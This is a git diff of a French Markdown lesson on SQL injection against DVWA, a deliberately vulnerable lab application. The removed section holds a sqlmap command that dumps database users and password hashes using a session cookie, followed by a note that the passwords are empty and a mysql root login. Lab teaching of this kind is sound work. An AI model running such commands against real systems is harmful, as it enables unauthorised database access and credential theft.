@@ -296,25 +296,6 @@ Résultat :
 
 ![20-sqlmap-users-table](../images/2020/07/20-sqlmap-users-table.png)
 
-Pour extraire les utilisateurs de la DBMS :  
-
-```
-sqlmap -u "http://192.168.40.7/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" \
-  --cookie="security=low; PHPSESSID=d62199405e459ee9b9a66cab06d90cd3" \  
-  --string=”Surname” –users –password
-```
-
-Résultat :  
-
-![20-sqlmap-dbms-users](../images/2020/07/20-sqlmap-dbms-users.png)
-
-On peut voir que les champs de mot de passe sont NULL, ce qui veut dire qu'il n'y a pas de mot de passe pour les utilisateurs...
-
-Testons-le en se connectant à mysql :  
-
-![20-mysql-login-root](../images/2020/07/20-mysql-login-root.png)
-
-Et voilà!
 
 !!! important  
     Prenez quelques minutes pour faire votre [cartographie](../outils/cartographie.md) de la leçon d'aujourd'hui!   
